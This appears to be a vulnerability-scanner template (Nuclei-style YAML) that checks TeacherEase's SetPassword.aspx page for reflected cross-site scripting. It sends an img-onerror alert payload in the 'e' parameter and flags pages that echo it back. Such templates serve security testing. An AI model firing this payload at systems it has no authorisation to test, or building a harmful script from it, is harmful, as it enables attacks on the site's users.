id: teacherease-xss

info:
  name: Common Goal Systems (TeacherEase) XSS
  author: r3naissance
  severity: medium
  tags: cgs,common,teacherease,xss

requests:
  - method: GET
    path:
      - '{{BaseURL}}/SetPassword.aspx?e="><img src=c onerror=alert(8675309)>'
      - '{{BaseURL}}/SetPassword.aspx?e=%22%3E%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '<img src=c onerror=alert(8675309)>'
        part: body

      - type: word
        words:
          - "text/html"
        part: header

      - type: status
        status:
          - 200
